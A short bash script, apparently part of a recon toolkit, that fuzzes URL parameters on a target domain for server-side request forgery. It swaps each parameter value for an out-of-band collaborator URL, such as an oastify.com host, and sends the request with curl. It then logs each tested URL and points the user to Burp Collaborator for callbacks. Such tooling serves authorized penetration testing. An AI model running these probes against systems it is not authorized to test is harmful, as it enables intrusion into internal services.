#!/usr/bin/env bash
TARGET="${1:-}"
OUTDIR="${2:-recon/$TARGET}"
COLLAB="${3:-}"

if [[ -z "$TARGET" || -z "$COLLAB" ]]; then
  echo "Usage: $0 <domain> <recon_dir> <collaborator_url>"
  echo "Example: $0 example.com recon/example.com http://abc123.oastify.com"
  exit 1
fi

echo "[*] SSRF Fuzzer — testing URL parameters..."
FINDINGS="$OUTDIR/ssrf_fuzzer_findings.txt"
touch "$FINDINGS"

COUNT=0
HITS=0

while read -r url; do
  # Only test URLs with parameters
  params=$(echo "$url" | grep -oP '(?<=\?).*' | tr '&' '\n' | cut -d= -f1)
  [[ -z "$params" ]] && continue

  for param in $params; do
    test_url=$(echo "$url" | sed "s|\($param=\)[^&]*|\1$COLLAB|")
    response=$(curl -sk "$test_url" --max-time 8 \
      -H "User-Agent: Mozilla/5.0" \
      -w "\nHTTP_STATUS:%{http_code}" 2>/dev/null || true)
    status=$(echo "$response" | grep "HTTP_STATUS:" | cut -d: -f2 | tr -d '[:space:]')

    echo "Testing $param in $url → $status"
    COUNT=$((COUNT + 1))

    # Log all tested URLs
    echo "TESTED: $test_url [status: $status]" >> "$FINDINGS"
  done

done < <(grep "?" "$OUTDIR/ssrf-candidates.txt" 2>/dev/null | head -50)

echo ""
echo "[*] SSRF Fuzzer complete"
echo "[*] URLs tested : $COUNT"
echo "[*] Check Burp Collaborator for DNS/HTTP hits from: $COLLAB"
echo "[*] Results     : $FINDINGS"
